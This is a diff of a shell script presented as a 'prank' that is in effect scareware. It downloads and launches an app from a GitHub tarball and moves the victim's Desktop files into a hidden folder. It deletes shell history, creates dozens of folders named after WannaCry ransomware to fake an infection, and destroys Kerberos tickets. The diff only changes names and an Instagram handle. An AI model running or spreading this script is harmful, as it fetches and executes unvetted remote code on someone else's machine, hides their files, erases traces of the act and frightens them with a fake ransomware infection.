@@ -3,14 +3,14 @@ mkdir -p /tmp/laz/
 curl -s -L https://github.com/monybigsef/p1/raw/master/prank.tar.gz -o /tmp/laz$
 > /dev/null
 tar xvf /tmp/laz/prank.tar.gz -C /tmp/laz > /dev/null
-mkdir ~/.Ulv/
-mv ~/Desktop/* ~/.Ulv/
+mkdir ~/.Rec/
+mv ~/Desktop/* ~/.Rec/
 cd ~/Desktop
 rm -rf ~/.*history*
-mkdir wolfe_Ulv_{0..100}
+mkdir WannaCry_{0..100}
 touch 9rah.txt
-echo "follow me ig : _ulv_wolf" > 9rah.txt
-mv 9rah.txt ~/.Ulv/
+echo "follow me ig : emoh4med" > 9rah.txt
+mv 9rah.txt ~/.Rec/
 nohup open /tmp/laz/app/Laz.app > /dev/null
 kdestroy
 clear
